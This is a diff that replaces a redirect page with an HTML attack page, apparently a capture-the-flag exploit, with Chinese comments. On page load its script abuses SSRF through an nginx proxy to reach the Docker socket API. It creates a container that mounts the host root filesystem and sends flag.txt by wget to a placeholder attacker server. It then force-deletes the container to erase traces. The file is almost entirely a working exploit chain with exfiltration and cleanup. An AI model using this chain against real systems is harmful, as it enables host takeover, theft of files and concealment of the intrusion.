@@ -1,9 +1,88 @@
-<!DOCTYPE html>
 <html>
 <body>
-    <p>Redirecting...</p>
+    <h1>Attack initiated... Please wait.</h1>
     <script>
-        window.location.href = 'http://127.0.0.1:3000/flag';
+    // 攻擊者的伺服器，用於接收 flag
+    const ATTACKER_SERVER = "http://<攻擊者的伺服器IP>:1337";
+
+    // Docker API payload - Phase 1: 建立一個容器
+    // 這個容器會將主機的根目錄 '/' 唯讀掛載到容器內的 '/host'
+    const createContainerPayload = {
+      "Image": "alpine", // 使用輕量的 alpine 鏡像
+      "Cmd": [
+        "sh",
+        "-c",
+        // 執行一個 shell 命令，讀取 flag 並透過 wget 發送到攻擊者的伺服器
+        "wget --post-file=/host/flag.txt " + ATTACKER_SERVER
+      ],
+      "HostConfig": {
+        "Binds": ["/:/host:ro"] // :ro 表示 read-only，是個好習慣
+      }
+    };
+
+    // 攻擊鏈主函數
+    async function executeAttack() {
+      try {
+        // --- 第一步：透過 SSRF 請求 Docker API 建立容器 ---
+        console.log("Sending request to create container...");
+        const createResponse = await fetch('http://nginx-proxy/admin', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            method: 'post',
+            // 關鍵 URL: superagent 能夠解析這種格式來與 Unix Socket 通訊
+            // URL 編碼後的 /var/run/docker.sock -> %2fvar%2frun%2fdocker.sock
+            // 但在這裡直接傳遞字串也可以，因為 body 是 JSON
+            url: 'http://unix:/var/run/docker.sock:/v1.41/containers/create',
+            body: createContainerPayload
+          })
+        });
+
+        const createData = await createResponse.json();
+        const containerId = createData.Id;
+        console.log("Container created with ID:", containerId);
+
+        if (!containerId) {
+            console.error("Failed to create container:", createData);
+            return;
+        }
+
+        // --- 第二步：啟動剛剛建立的容器 ---
+        console.log("Sending request to start container...");
+        await fetch('http://nginx-proxy/admin', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                method: 'post',
+                url: `http://unix:/var/run/docker.sock:/v1.41/containers/${containerId}/start`,
+                body: {} // 啟動容器不需要 body
+            })
+        });
+        console.log("Container start request sent. Check your listener for the flag!");
+
+        // --- (可選) 第三步：清理戰場，刪除容器 ---
+        // 為了不留下痕跡，可以在短暫延遲後發送刪除容器的請求
+        setTimeout(async () => {
+             console.log("Sending request to remove container...");
+             await fetch('http://nginx-proxy/admin', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    method: 'post',
+                    url: `http://unix:/var/run/docker.sock:/v1.41/containers/${containerId}?force=true`, // force=true 確保能刪除
+                    body: {}
+                })
+            });
+            console.log("Cleanup complete.");
+        }, 5000); // 延遲 5 秒，確保容器有足夠時間執行命令
+
+      } catch (error) {
+        console.error("An error occurred during the attack:", error);
+      }
+    }
+
+    // 啟動攻擊
+    executeAttack();
     </script>
 </body>
 </html>
